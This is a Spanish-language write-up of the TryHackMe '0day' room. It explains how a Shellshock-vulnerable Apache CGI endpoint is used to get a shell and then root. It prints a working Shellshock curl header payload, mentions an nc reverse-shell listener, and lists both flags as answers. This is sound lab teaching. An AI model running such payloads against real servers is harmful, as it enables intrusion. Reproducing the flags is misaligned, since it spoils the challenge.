# 0day

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF / Explotación | 0day | https://tryhackme.com/room/0day | 02 Level Medium | TryHackMe | Apache CGI, Shellshock, Linux | Compromiso total del host (RCE + root) |

---

**Contexto:** La sala **0day** es un CTF de estilo boot2root sobre una máquina Linux que expone un servidor Apache con CGI vulnerable a **Shellshock** (CVE-2014-6271). El atacante enumera los servicios, abusa de la falla en las cabeceras HTTP (User-Agent/Referer) para ejecutar comandos remotos, obtiene un shell y escala privilegios hasta **root**. La resolución combina explotación web, conexión reversa y escalada local hasta recoger las dos flags que acreditan el compromiso.

## Solucionario

### Task 1: Flag de usuario
**Explicación:**

Tras enumerar la máquina con `nmap`, se detecta un Apache con CGI expuesto. La vulnerabilidad **Shellshock** (CVE-2014-6271) permite inyectar comandos a través de variables de entorno HTTP. Se explota con un payload de tipo `() { :; }; <comando>` en la cabecera `User-Agent` o `Referer` para ejecutar `cat` sobre la flag del usuario.

```bash
nmap -sV -sC <IP>
curl -H "User-Agent: () { :; }; /bin/bash -c 'cat /home/<user>/user.txt'" http://<IP>/cgi-bin/<script>
```

Respuesta: `THM{Sh3llSh0ck_r0ckz}`

### Task 2: Flag de root
**Explicación:**

Una vez se dispone de ejecución de comandos, se establece una reverse shell (`nc`) y se escala privilegios a **root** aprovechando binarios SUID mal configurados o credenciales filtradas en la máquina. Con acceso root se lee la flag final del sistema.

```bash
nc -lvnp <PORT>
# Tras escalar a root:
cat /root/root.txt
```

Respuesta: `THM{g00d_j0b_0day_is_Pleased}`

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de usuario | `THM{Sh3llSh0ck_r0ckz}` |
| 2 | Flag de root | `THM{g00d_j0b_0day_is_Pleased}` |

---

**Metodología:** Enumeración de servicios con nmap, explotación de Shellshock (CVE-2014-6271) mediante cabeceras HTTP, obtención de reverse shell, escalada de privilegios y captura de flags.

**Learning chain:** Reconocimiento → identificación de superficie vulnerable → RCE vía HTTP → shell estable → escalada local → flags.

**Lección:** *Un único endpoint CGI sin proteger convierte una cabecera HTTP en RCE; hay que auditar siempre versiones de librerías y servicios expuestos.*

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application · T1059 Command and Scripting Interpreter · T1068 Exploitation for Privilege Escalation.

**Fuente:** [TryHackMe - 0day](https://tryhackme.com/room/0day)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.